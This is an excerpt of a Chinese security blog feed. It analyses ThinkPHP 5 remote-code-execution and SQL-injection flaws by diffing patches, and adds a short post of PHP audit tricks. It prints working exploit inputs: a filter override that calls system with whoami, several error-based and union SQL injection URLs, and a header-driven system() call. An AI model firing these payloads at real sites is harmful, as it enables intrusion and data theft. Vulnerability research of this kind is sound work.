href="https://github.com/top-think/framework/releases?after=v5.1.33">5.0.24</a>版本更新说明中表示包含一个安全更新，具体看到<a href="https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003">改进Request类</a>这个commit</p><p><img src="/img/tp5ldfxrce_e.png"></p><p>调用<code>Request</code>类方法前做了白名单判断，猜测漏洞可能是能调用当前类任意方法，找到<code>Config::get(&#39;var_method&#39;)</code>对应的值为<code>_method</code>。</p><p><img src="/img/tp5ldfxrce_f.png"></p><p>回顾一下SQL注入篇中说过<code>凡是使用框架提供的请求变量获取方法(Request类param方法及input助手函数)，都会经过这个filterExp方法的过滤</code>，其中的<code>filterExp</code>方法是被<code>filterValue</code>方法拉起调用的，而<code>filterValue</code>方法中就存在敏感函数<code>call_user_func</code>：</p><p><img src="/img/tp5ldfxrce_g.png"></p><p>全局搜索对应的<code>filterValue</code>方法，看到可以由824行的<code>cookie</code>方法或是由994行的<code>input</code>方法触发（但是似乎框架默认逻辑没有用到<code>cookie</code>方法）。</p><p><img src="/img/tp5ldfxrce_h.png"></p><p>跟进<code>getFilter</code>方法后看上去影响不大先不管，回来继续向上跟进<code>array_walk_recursive</code>函数传递的第一和第三个参数，进而寻找调用了<code>input</code>方法的地方（<code>-&gt;input\(|::input\(</code>）：</p><p><img src="/img/tp5ldfxrce_i.png"></p><p>这个构造函数简直来得不要太妙（是个伏笔2333）：如果当前类中的属性名有与<code>$options</code>数组中键名相同的，就会被覆盖为相应的键值，并且给<code>$this-&gt;input</code>属性赋值了完全可控的<code>php://input</code>。</p><p>有很多地方调用了<code>input</code>方法，先看下<code>Request</code>类的<code>param</code>方法：</p><p><img src="/img/tp5ldfxrce_j.png"></p><p>出现了被更新白名单的<code>method</code>方法，至此利用链的链尾已经基本清晰：</p><p>?-&gt;<code>param</code>-&gt;<code>method</code>、<code>input</code>-&gt;<code>filterValue</code>-&gt;<code>call_user_func</code></p><p>接下来需要思考如何通过<code>Request</code>类的某个方法修改默认为空的<code>$filter</code>的值呢？刚才那个构造函数刚好可以实现对<code>$this-&gt;filter</code>变量覆盖！也就是通过$_POST传入<code>_method=__construct&amp;filter[]=system</code>。搞定了一个参数，继续想办法搞定另外一个参数：</p><p><img src="/img/tp5ldfxrce_k.png"></p><p>继续通过变量覆盖控制<code>$this-&gt;get</code>或者<code>$this-&gt;route</code>的值，就能直接进到<code>input</code>方法中。也就是继续通过$_POST传入<code>&amp;get[]=whoami</code>或是<code>&amp;route[]=whoami</code>，此时如果<code>&#39;app_debug&#39; =&gt; true,</code>就可以直接看到命令执行结果：</p><p><img src="/img/tp5ldfxrce_l.png"></p><p>这也印证了此时的<code>param</code>方法确实被框架调用了，但是一旦关掉<code>app_debug</code>就会发现并不能RCE了 T^T，显然事情没这么简单，我们还是得继续老实向前分析调用栈。动态调试一下看看调用栈里是谁翻了<code>param</code>方法的牌子：</p><p><img src="/img/tp5ldfxrce_m.png"></p><p><code>self::$debug</code>就是框架从配置文件中加载的值，所以关掉<code>app_debug</code>就不会调用到<code>param</code>方法了（淦）。那还有没有办法调用到呢？全局搜索可以看到当<code>App</code>类的<code>exec</code>方法中<code>$dispatch[&#39;type&#39;]</code>为<code>controller</code>或是<code>method</code>时就可以。</p><p><img src="/img/tp5ldfxrce_n.png"></p><p>于是继续跟进方法调用和变量传递：</p><p><img src="/img/tp5ldfxrce_o.png"></p><p><img src="/img/tp5ldfxrce_p.png"></p><p><img src="/img/tp5ldfxrce_q.png"></p><p><code>check</code>方法里面有点复杂。。。马后炮一下直接先看<code>parseRule</code>方法：</p><p><img src="/img/tp5ldfxrce_r.png"></p><p>需要<code>$route</code>为<code>\</code>或者<code>@</code>，继续回去跟进变量传递：</p><p><img src="/img/tp5ldfxrce_s.png"></p><p>TP5完整版或是通过<code>composer require topthink/think-captcha 1.*</code>安装的验证码扩展，会在<code>vendor/topthink/think-captcha/src/helper.php</code>中注册一条<code>get</code>路由。由于此处<code>$method</code>是通过<code>$request-&gt;method()</code>获取到的，所以能够通过$_POST传入<code>&amp;method=get</code>间接对其进行变量覆盖。</p><p><img src="/img/tp5ldfxrce_t.png"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.anquanke.com/post/id/222672">ThinkPHP5.0.x RCE分析与利用</a></p><p><a href="https://0kee.360.cn/blog/thinkphp-5-x-rce-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/">THINKPHP 5.X RCE 漏洞分析与利用总结</a></p><p><a href="https://www.anquanke.com/post/id/177173">天融信关于ThinkPHP5.1框架结合RCE漏洞的深入分析</a></p><p><a href="https://github.com/Mochazz/ThinkPHP-Vuln/tree/master/ThinkPHP5">ThinkPHP-Vuln</a></p><p><a href="https://paper.seebug.org/1377/">ThinkPHP 组件漏洞与攻击链分析</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;环境搭建基础可以参考SQL注入篇和官方文档&lt;/p&gt;
&lt;h2 id=&quot;代码执行1&quot;&gt;&lt;a href=&quot;#代码执行1&quot; class=&quot;headerlink&quot; title=&quot;代码执行1&quot;&gt;&lt;/a&gt;代码执行1&lt;/h2&gt;&lt;p&gt;通过传参可以调用任意类方法，调用一些具有回调功能的函数时可</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="thinkphp" scheme="https://hosch3n.github.io/tags/thinkphp/"/>
    
    <category term="rce" scheme="https://hosch3n.github.io/tags/rce/"/>
    
  </entry>
  
  <entry>
    <title>TP5漏洞分析SQL注入篇</title>
    <link href="https://hosch3n.github.io/2020/10/21/TP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90SQL%E6%B3%A8%E5%85%A5%E7%AF%87/"/>
    <id>https://hosch3n.github.io/2020/10/21/TP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90SQL%E6%B3%A8%E5%85%A5%E7%AF%87/</id>
    <published>2020-10-21T13:12:12.000Z</published>
    <updated>2020-12-02T08:51:27.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基础设施"><a href="#基础设施" class="headerlink" title="基础设施"></a>基础设施</h2><p>大致扫一遍ThinkPHP官方的《完全开发手册》，知道有疑问时应该去哪个章节找就行。</p><ol start="0"><li>通过composer拉取项目</li></ol><p><code>composer create-project --prefer-dist topthink/think=5.0.15 tpdemo</code></p><ol><li>调整<code>composer.json</code>中的依赖为需要测试的具体版本</li></ol><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;require&quot;: &#123;</span><br><span class="line">    &quot;php&quot;: &quot;&gt;=5.4.0&quot;,</span><br><span class="line">    &quot;topthink/framework&quot;: &quot;5.0.15&quot;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><ol start="2"><li><p>执行<code>composer update</code>更新项目</p></li><li><p>创建mysql数据库</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">create database tpdemo;</span><br><span class="line">use tpdemo;</span><br><span class="line">create table users(</span><br><span class="line">    id int primary key auto_increment,</span><br><span class="line">    username varchar(50) not null</span><br><span class="line">);</span><br><span class="line">insert into users(id,username) values(1,&#39;hoschen&#39;);</span><br><span class="line">create user tpdemo@localhost identified by &#39;passwd&#39;;</span><br><span class="line">grant all on tpdemo.* to tpdemo@localhost;</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><ol start="4"><li><p>配置<code>application/database.php</code>中对应参数</p></li><li><p>将<code>application/config.php</code>中的<code>app_debug</code>和<code>app_trace</code>改为<code>true</code>，用于回显错误</p></li><li><p>编写<code>application/index/controller/Index.php</code>模块的代码构造漏洞输入点</p></li></ol><h2 id="SQL注入1"><a href="#SQL注入1" class="headerlink" title="SQL注入1"></a>SQL注入1</h2><p>Builder类（thinkphp/library/think/db/Builder.php）的parseData方法，将未过滤的用户输入拼接进insert/update语句，存在SQL注入漏洞。</p><p>影响版本：</p><ul><li>5.0.13&lt;=ThinkPHP&lt;=5.0.15</li><li>5.1.0&lt;=ThinkPHP&lt;=5.1.5</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tpdemo&#x2F;public&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;index&#x2F;index&amp;username[0]&#x3D;inc&amp;username[1]&#x3D;exp(~(select * from(select user())a))&amp;username[2]&#x3D;1</span><br></pre></td></tr></table></figure><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><a href="https://github.com/top-think/framework/releases?after=v5.0.18">5.0.16</a>版本更新说明中表示包含一个安全更新，具体看到<a href="https://github.com/top-think/framework/commit/091e7b734d4ce3e1288f47a7932a143fad73a4bd?branch=091e7b734d4ce3e1288f47a7932a143fad73a4bd&diff=split">改进inc/dec查询</a>这个commit</p><p><img src="/img/tp5ldfxsqli_a.png"></p><p>将源码版本更新为<code>5.0.15</code>，由<code>thinkphp/library/think/db/Builder.php</code>的113行可知触发这部分逻辑需要传入一个数组：</p><p><img src="/img/tp5ldfxsqli_b.png"></p><p>全局搜索对应的<code>parseData</code>方法，看到可以由718行的<code>insert</code>方法或是由823行的<code>update</code>方法触发。编写对应触发逻辑：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 通过request助手函数的get方法，获取$_GET[&#x27;username&#x27;]的数据</span></span><br><span class="line">        $username = request()-&gt;get(<span class="string">&#x27;username/a&#x27;</span>);</span><br><span class="line">        <span class="comment">// 通过db助手函数的insert方法，传入username数组（上面/a修饰符表示数组类型）</span></span><br><span class="line">        db(<span class="string">&#x27;users&#x27;</span>)-&gt;insert([<span class="string">&#x27;username&#x27;</span> =&gt; $username]);</span><br><span class="line">        <span class="comment">// 也可以通过update方法</span></span><br><span class="line">        <span class="comment">// db(&#x27;users&#x27;)-&gt;where(&#x27;id&#x27;,1)-&gt;update([&#x27;username&#x27; =&gt; $username]);</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Update success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟一下变量的传递过程可知，<code>username</code>即对应我们需要触发的那段逻辑中switch语句的<code>$val</code>，于是传入<code>username[0]=dec&amp;username[1]=a&amp;username[2]=1</code>进行动态调试，中间经过<code>parseKey</code>等函数后最终生成的sql语句：</p><p><img src="/img/tp5ldfxsqli_c.png"></p><p>显然<code>str_replace</code>函数是一个功能性函数，而并非是安全过滤函数，最终使得用户提供的数据被直接拼接进SQL语句中。</p><p>因为<code>username[0]</code>用于控制switch语句条件、<code>username[2]</code>会经过<code>floatval</code>函数强转，所以尝试通过<code>username[1]</code>传入报错注入Payload：</p><p><code>username[0]=dec&amp;username[1]=(extractvalue(1,concat(0x7e,(select user()),0x7e)))&amp;username[2]=1</code></p><p>得到报错：<code>1105 Only constant XPATH queries are supported</code>，XPATH系列用不了，换一种：</p><p><code>username[0]=dec&amp;username[1]=exp(~(select * from(select user())a))&amp;username[2]=1</code></p><p>最终拼接而成的SQL语句为：</p><p><code>&quot;INSERT INTO `users` (`username`) VALUES (exp(~(select * from(select user())a))-1) &quot;</code></p><p><img src="/img/tp5ldfxsqli_d.png"></p><p><code>update</code>方法类似就不再赘述了，需要注意的是官方修复时仅处理了<code>inc</code>和<code>dec</code>条件，但是并没有改动同样在switch语句中的<code>exp</code>条件，原因是当<code>username[0]</code>为<code>exp</code>时，会被<code>thinkphp/library/think/Request.php</code>中1096行的<code>filterExp</code>方法替换为<code>exp[空格]</code>，最终因为不满足switch语句的任意条件被结束。</p><h2 id="SQL注入2"><a href="#SQL注入2" class="headerlink" title="SQL注入2"></a>SQL注入2</h2><p>Builder类（thinkphp/library/think/db/Builder.php）的parseArrayData方法，将未过滤的用户输入拼接进insert/insertAll/update语句，存在SQL注入漏洞。</p><p>影响版本：</p><ul><li>5.1.6&lt;=ThinkPHP&lt;=5.1.7、以及部分5.1.8</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tpdemo&#x2F;public&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;index&#x2F;index&amp;username[0]&#x3D;point&amp;username[1]&#x3D;a&amp;username[2]&#x3D;exp(~(select * from(select user())a))^&amp;username[3]&#x3D;a</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><a href="https://github.com/top-think/framework/releases?after=v5.1.13">5.1.9</a>版本更新说明中表示包含一个安全更新，具体看到<a href="https://github.com/top-think/framework/commit/39bb0fe6d50ee77e0779f646b10bce08c442a5e3">改进mysql驱动</a>这个commit</p><p><img src="/img/tp5ldfxsqli_e.png"></p><p>直接删掉了<code>default</code>分支和<code>parseArrayData</code>方法。将源码版本更新为<code>5.1.17</code>，可以看到基本与SQL注入1逻辑相同。</p><p>全局搜索对应的<code>parseData</code>方法，看到可由1030行的<code>insert</code>方法、1063行的<code>insertAll</code>方法或是由1134行的<code>update</code>方法触发。需要编写的对应触发逻辑用SQL注入1的就行，而且多了一种触发方式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// insertAll方法接收一个二维数组</span></span><br><span class="line">db(<span class="string">&#x27;users&#x27;</span>)-&gt;insertAll([[<span class="string">&#x27;username&#x27;</span> =&gt; $username]]);</span><br></pre></td></tr></table></figure><p>跟一下变量的传递过程可知，<code>username</code>依然对应我们需要触发的那段逻辑中switch语句的<code>$val</code>，这次进入default分支跟进<code>parseArrayData</code>方法，看到需要让<code>username[0]</code>为<code>point</code>不然就会嗝屁：</p><p><img src="/img/tp5ldfxsqli_f.png"></p><p>因此传入<code>username[0]=point&amp;username[1]=a&amp;username[2]=b&amp;username[3]=c</code>进行动态调试，中间经过<code>parseData</code>等函数后最终生成的sql语句：</p><p><img src="/img/tp5ldfxsqli_g.png"></p><p>方便起见直接在<code>b</code>的位置传入报错注入Payload并闭合语句：</p><p><code>username[0]=point&amp;username[1]=a&amp;username[2]=exp(~(select * from(select user())a))^&amp;username[3]=a</code></p><p>最终拼接而成的SQL语句为：</p><p><code>&quot;INSERT INTO `users` (`username`) VALUES (exp(~(select * from(select user())a))^(&#39;a(a)&#39;)) &quot;</code></p><p><img src="/img/tp5ldfxsqli_h.png"></p><ul><li><code>update</code>和<code>insertAll</code>方法同理</li></ul><h2 id="SQL注入3"><a href="#SQL注入3" class="headerlink" title="SQL注入3"></a>SQL注入3</h2><p>Builder类（thinkphp/library/think/db/Builder.php）的parseWhereItem方法，将未过滤完全的用户输入拼接进where语句，存在SQL注入漏洞。</p><p>影响版本：</p><ul><li>5.0.10</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tpdemo&#x2F;public&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;index&#x2F;index&amp;username[0]&#x3D;not%20like&amp;username[1][0]&#x3D;%%&amp;username[1][1]&#x3D;anything&amp;username[2]&#x3D;)%20union%20select%20database(),user()%23</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><a href="https://github.com/top-think/framework/releases?after=v5.0.14">5.0.11</a>版本更新说明中表示包含一个安全更新，具体看到<a href="https://github.com/top-think/framework/commit/495020b7b0c16de40f20b08f2ab3be0a2b816b96">改进Request类filterExp方法</a>这个commit，增加了对<code>not like</code>的过滤。</p><p><img src="/img/tp5ldfxsqli_j.png"></p><p>凡是使用框架提供的请求变量获取方法(Request类<code>param</code>方法及<code>input</code>助手函数)，都会经过这个<code>filterExp</code>方法的过滤。针对<code>not like</code>操作符，编写对应的<code>where</code>方法触发逻辑：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$username = request()-&gt;get(<span class="string">&#x27;username/a&#x27;</span>);</span><br><span class="line">$result = db(<span class="string">&#x27;users&#x27;</span>)-&gt;where([<span class="string">&#x27;username&#x27;</span> =&gt; $username])-&gt;select();</span><br><span class="line">var_dump($result);</span><br></pre></td></tr></table></figure><p>相比前两个代码改动直接在漏洞点的补丁分析，这里的代码改动是在全局过滤函数的规则上，该如何根据这个变动敏感地嗅探到能被利用漏洞点呢？这是需要之后进一步思考的地方。</p><p>带着这个问题动态调试可以发现，输入流过程中有很多针对数组的解析函数，也会理解Payload要这样构造的原因：当然就是要满足一些if判断逻辑，让输入流进入到预期漏洞代码块了hhh（废话）</p><p><img src="/img/tp5ldfxsqli_k.png"></p><ul><li>因为PHP7的原因，需要调整一下implode函数的参数顺序</li></ul><p><img src="/img/tp5ldfxsqli_l.png"></p><p>一波拼接操作后生成的<code>whereStr</code>为<code>&quot;(`username` NOT LIKE &#39;%%&#39; ) UNION SELECT DATABASE(),USER()# `username` NOT LIKE &#39;anything&#39;)&quot;</code></p><p>这样就能让<code>username</code>字段匹配不到NULL之外的值避免占据回显点位，同时注释掉后面被implode函数合并进来的副作用语句，避免语法错误。</p><p>最终带入数据库执行的SQL语句为：</p><p><img src="/img/tp5ldfxsqli_m.png"></p><p>官方在个版本里新引入了<code>NOT LIKE</code>这个操作符，但是没加上对应的过滤规则导致了漏洞的产生。</p><h2 id="SQL注入4"><a href="#SQL注入4" class="headerlink" title="SQL注入4"></a>SQL注入4</h2><p>特定模式（<code>exp</code>）下的SQL语句执行：</p><p>影响版本：</p><ul><li>全版本</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tpdemo&#x2F;public&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;index&#x2F;index&amp;username&#x3D;) union select database(),user()%23</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>这里官方认为属于正常功能不作修复，因此不存在补丁更新对比。编写对应触发逻辑来调试分析一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$username = request()-&gt;get(<span class="string">&#x27;username/a&#x27;</span>);</span><br><span class="line">$result = db(<span class="string">&#x27;users&#x27;</span>)-&gt;where([<span class="string">&#x27;username&#x27;</span> =&gt; $username])-&gt;select();</span><br><span class="line">var_dump($result);</span><br></pre></td></tr></table></figure><p><img src="/img/tp5ldfxsqli_i.png"></p><p>流程与上一个洞类似就不赘述了，查看《ThinkPHP5.0完全开发手册》193页可以看到说明了<code>exp</code>模式就是用作SQL语法模式的，所以我个人觉得官方不认为这是一个漏洞也在情理之中。</p><h2 id="SQL注入5"><a href="#SQL注入5" class="headerlink" title="SQL注入5"></a>SQL注入5</h2><p>Builder类（thinkphp/library/think/db/Builder.php）的parseOrder方法，将未过滤的用户输入拼接进select/update/delete语句，存在SQL注入漏洞。</p><p>影响版本：</p><ul><li>5.1.16&lt;=ThinkPHP&lt;=5.1.22</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tpdemo&#x2F;public&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;index&#x2F;index&amp;orderby[id&#96;|updatexml(1,concat(0x7e,(select user()),0x7e),1)%23]&#x3D;1</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-4"><a href="#漏洞分析-4" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><a href="https://github.com/top-think/framework/releases?after=v5.1.30">5.1.23</a>版本更新说明中表示改进了order方法的数组方式解析增强安全性，具体看到<a href="https://github.com/top-think/framework/commit/673e505421b25bdee2f02b668e5fd1ac79a3d190">改进order方法解析</a>这个commit</p><p><img src="/img/tp5ldfxsqli_n.png"></p><p>增加了对<code>)</code>和<code>#</code>符号的判断。将源码版本更新为<code>5.1.22</code>，全局搜索<code>parseOrder</code>方法，看到可以由1037行的select方法、1170行的update方法或是由1206行的delete方法触发。编写对应触发逻辑：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$orderby = request()-&gt;get(<span class="string">&#x27;orderby&#x27;</span>);</span><br><span class="line"><span class="comment">// $result = db(&#x27;users&#x27;)-&gt;where([&#x27;username&#x27; =&gt; &#x27;hoschen&#x27;])-&gt;order($orderby)-&gt;find();</span></span><br><span class="line"><span class="comment">// 也可以通过update方法，</span></span><br><span class="line"><span class="comment">// db(&#x27;users&#x27;)-&gt;where(&#x27;id&#x27;, 1)-&gt;order($orderby)-&gt;update([&#x27;username&#x27; =&gt; &#x27;hoschen&#x27;]);</span></span><br><span class="line"><span class="comment">// 还可以通过delete方法，支持XPATH系列函数</span></span><br><span class="line">db(<span class="string">&#x27;users&#x27;</span>)-&gt;where(<span class="string">&#x27;id&#x27;</span>, <span class="number">1</span>)-&gt;order($orderby)-&gt;delete();</span><br><span class="line">var_dump($result);</span><br></pre></td></tr></table></figure><p>这里传入Payload动态调试后可以发现拼接而成的SQL语句为：<code>&quot;DELETE FROM `users` WHERE  `id` = :where_AND_id ORDER BY `id`|updatexml(1,concat(0x7e,(select user()),0x7e),1)#` &quot; </code></p><p>为啥这里用的delete方法？因为在我的环境下前两种方法都会得到报错：<code>1105 Only constant XPATH queries are supported</code>，而通过exp等函数整数溢出报错也无效，希望知道原因的师傅指点我一下。</p><h2 id="SQL注入6"><a href="#SQL注入6" class="headerlink" title="SQL注入6"></a>SQL注入6</h2><p>聚合查询方法将未过滤的用户输入拼接进SQL语句中，存在SQL注入漏洞。</p><p>影响版本：</p><ul><li>5.0.0&lt;=ThinkPHP&lt;=5.0.21</li><li>5.1.3&lt;=ThinkPHP&lt;=5.1.25</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 5.1.11～5.1.25需要改为 id&#96;)</span><br><span class="line">id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-5"><a href="#漏洞分析-5" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><a href="https://github.com/top-think/framework/releases?after=v5.1.30">5.1.26</a>版本更新说明中表示包含一个安全更新，具体看到<a href="https://github.com/top-think/framework/commit/26a1b2fe9571c151ccd5e7ad05b3bb33385ecde3">改进mysql驱动和sqlsrv驱动</a>这个commit</p><p><img src="/img/tp5ldfxsqli_o.png"></p><p>只允许字母、数字、下划线、点号、星号，不然抛出异常。</p><ul><li>因为对框架不熟悉，想根据这类补丁对比找出具体的漏洞发生点实在是困难，得多学习历史漏洞积累经验才行。这里也由于暂未复现成功，只能先搁置一下了</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://github.com/Mochazz/ThinkPHP-Vuln/tree/master/ThinkPHP5">ThinkPHP-Vuln</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;基础设施&quot;&gt;&lt;a href=&quot;#基础设施&quot; class=&quot;headerlink&quot; title=&quot;基础设施&quot;&gt;&lt;/a&gt;基础设施&lt;/h2&gt;&lt;p&gt;大致扫一遍ThinkPHP官方的《完全开发手册》，知道有疑问时应该去哪个章节找就行。&lt;/p&gt;
&lt;ol start=&quot;0&quot;&gt;
</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="thinkphp" scheme="https://hosch3n.github.io/tags/thinkphp/"/>
    
    <category term="sqli" scheme="https://hosch3n.github.io/tags/sqli/"/>
    
  </entry>
  
  <entry>
    <title>PHP代码审计Tricks</title>
    <link href="https://hosch3n.github.io/2020/10/15/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1Tricks/"/>
    <id>https://hosch3n.github.io/2020/10/15/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1Tricks/</id>
    <published>2020-10-15T13:09:19.000Z</published>
    <updated>2020-12-07T14:43:53.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="反序列化调用不到类"><a href="#反序列化调用不到类" class="headerlink" title="反序列化调用不到类"></a>反序列化调用不到类</h2><p><img src="/img/phpdmsjtricks_a.png"></p><p>希望调用<code>ws.php</code>中<code>CLI\Agent</code>类的析构函数，但是传入<code>new CLI\Agent()</code>的序列化字符串后并未触发<code>die</code>标记，通过动态调试发现该框架此时会去寻找<code>lib/cli/agent.php</code>（但实际上是<code>Agent</code>类与<code>WS</code>类一起写在了<code>ws.php</code>中）</p><p><img src="/img/phpdmsjtricks_b.png"></p><p>解决方法是生成序列化字符串时，通过数组<code>array(new CLI\WS(), new CLI\Agent())</code>将两个类对象按顺序一同传入。这样虽然<code>autoload</code>包含<code>agent.php</code>同样会失败，但能够包含到<code>ws.php</code>也就能成功反序列化里面的<code>Agent</code>类。</p><ul><li>也看到了通过<code>new \CLI\WS(new \CLI\Agent())</code>的形式解决的</li></ul><h2 id="函数无参数RCE"><a href="#函数无参数RCE" class="headerlink" title="函数无参数RCE"></a>函数无参数RCE</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* HTTP Header</span></span><br><span class="line"><span class="comment">...</span></span><br><span class="line"><span class="comment">key: system(&#x27;ls -al&#x27;);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">var_dump(end(getallheaders()));</span><br></pre></td></tr></table></figure><h2 id="链中的函数参数对应不上"><a href="#链中的函数参数对应不上" class="headerlink" title="链中的函数参数对应不上"></a>链中的函数参数对应不上</h2><p>通过PHP编写的一些自定义函数，如果一些非关键参数缺失或者多余其实影响不大。但是PHP的内置函数可能是因为由C实现的原因，兼容性就没那么高。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">PHP Parametric Function RCE</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;反序列化调用不到类&quot;&gt;&lt;a href=&quot;#反序列化调用不到类&quot; class=&quot;headerlink&quot; title=&quot;反序列化调用不到类&quot;&gt;&lt;/a&gt;反序列化调用不到类&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/img/phpdmsjtricks_a.png&quot;&gt;&lt;/p&gt;
&lt;</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="php" scheme="https://hosch3n.github.io/tags/php/"/>
    
    <category term="unserialize" scheme="https://hosch3n.github.io/tags/unserialize/"/>
    
  </entry>
  
  <entry>
    <title>SSRF打Redis规避坏字符</title>
    <link href="https://hosch3n.github.io/2020/09/25/SSRF%E6%89%93Redis%E8%A7%84%E9%81%BF%E5%9D%8F%E5%AD%97%E7%AC%A6/"/>
    <id>https://hosch3n.github.io/2020/09/25/SSRF%E6%89%93Redis%E8%A7%84%E9%81%BF%E5%9D%8F%E5%AD%97%E7%AC%A6/</id>
    <published>2020-09-24T16:43:14.000Z</published>
    <updated>2020-11-23T08:13:04.000Z</updated>
    
